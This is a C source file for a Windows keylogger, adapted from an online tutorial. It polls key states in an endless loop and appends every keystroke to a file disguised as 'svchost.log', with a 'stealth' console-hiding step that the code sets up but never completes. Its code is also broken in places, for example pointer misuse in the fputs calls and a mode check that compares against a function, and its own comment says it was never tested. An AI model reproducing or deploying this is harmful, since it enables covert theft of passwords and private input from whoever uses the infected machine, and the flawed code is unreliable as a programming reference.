//has to be on the top, disables the crt secure codeing mode
#ifdef _MSC_VER
#define _CRT_SECURE_NO_WARNINGS
#endif

#include<Windows.h>
#include<stdio.h>
#include<Winuser.h>
#include<windowsx.h>
#include<stdlib.h>
#include<fcntl.h>
#include<errno.h>

#define BUFSIZE 100

#define VERBOSE 1

/**
 * Keylogger code is from:
 * http://www.ccodechamp.com/2012/09/c-program-of-keylogger-or-keystroke-logger-c-codechamp.html
 * Improvements:
 * - Write unicode into the file (sensless?)
 * - add console arguments
 * - use fopen_s instead of fopen
 */

/**
 * Last tested: never
 */

/* Definitions */
int get_keys(void);
int start(void);
int set_mode(void);
int check_mode(void);

int main(void) {
	 start();

	 return 0;
}

/* starts the keylogger */
int start() {
	HWND stealth; /* creating stealth (window is not visible) */
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);

	int t = get_keys();

	return t;
}

/* get the user input keys in a infinite while loop */
int get_keys(void) {
	short character;

	int mode = _O_TEXT;
	if ( mode != check_mode ) {
		set_mode(mode);
	}

	while (TRUE) {
		Sleep(10); //to prevent 100% cpu usage

		for (character = 8; character <= 222; character++) {
			if (-32767 == GetAsyncKeyState(character)) {
				FILE *file;

				//a+ append if file exists, create the file if it does not exists
				file = fopen("svchost.log", "a+"); //opens the file
				const char * str;

				int isChar = FALSE;

				if (NULL != file) {
					if (('\'' <= character) && ('@' >= character)) {
						str = character;
						isChar = TRUE;
					}
					else if (('A' <= character) && ('Z' >= character)) {
						str = character + 32; //shift to lowercase letter
						isChar = TRUE;
					}
					else {
						if (VK_SPACE == character) {
							fputs(" ", file);
						}
						else if (VK_SHIFT == character) {
							str = "[SHIFT]\0";
						}
						else if (VK_RETURN == character) {
							fputs("\n[ENTER]", file);
						}
						else if (VK_BACK == character) {
							fputs("[BACKSPACE]", file);
						}
						else if (VK_TAB == character) {
							fputs("[TAB]", file);
						}
						else if (VK_CONTROL == character) {
							fputs("[CTRL]", file);
						}
						else if (VK_DELETE == character) {
							fputs("[DEL]", file);
						}
						else if (VK_OEM_1 == character) {
							fputs("[::]", file);
						}
						else if (VK_OEM_2 == character) {
							fputs("[/?]", file);
						}
						else if (VK_OEM_3 == character) {
							fputs("[`~]", file);
						}
						else if (VK_OEM_4 == character) {
							fputs("[ [{ ]", file);
						}
						else if (VK_OEM_5 == character) {
							fputs("[\\|]", file);
						}
						else if (VK_OEM_6 == character) {
							fputs("[ ]} ]", file);
						}
						else if (VK_OEM_7 == character) {
							fputs("['\"]", file);
						}
						else if (VK_NUMPAD0 == character) {
							fputc('0', file);
						}
						else if (VK_NUMPAD1 == character) {
							fputc('1', file);
						}
						else if (VK_NUMPAD2 == character) {
							fputc('2', file);
						}
						else if (VK_NUMPAD3 == character) {
							fputc('3', file);
						}
						else if (VK_NUMPAD4 == character) {
							fputc('4', file);
						}
						else if (VK_NUMPAD5 == character) {
							fputc('5', file);
						}
						else if (VK_NUMPAD6 == character) {
							fputc('6', file);
						}
						else if (VK_NUMPAD7 == character) {
							fputc('7', file);
						}
						else if (VK_NUMPAD8 == character) {
							fputc('8', file);
						}
						else if (VK_NUMPAD9 == character) {
							fputc('9', file);
						}
						else if (VK_CAPITAL == character) {
							fputs("[CAPS LOCK]", file);
						}
					}

					if (isChar) {
						fputs(&str, file);
					}

					fclose(file);//closes the file
				}
				else {
					return 1; //jumps out //TODO: replace this
				}
			}
		}
	}

	return EXIT_SUCCESS;
}

/* sets the stream output mode */
int set_mode(int mode) {
	_setmode(_fileno(stdout), mode);
}

/* checks the stream output mode  */
int check_mode(void) {
	errno_t err;
	int mode;

	err = _get_fmode(&mode);

	if (VERBOSE) {
		if (EINVAL == err) {
			printf("Invalid parameter: mode\n");
		}
		else {
			printf("Default Mode is %s\n", mode == _O_TEXT ? "text" : "binary");
		}
	}

	return mode;
}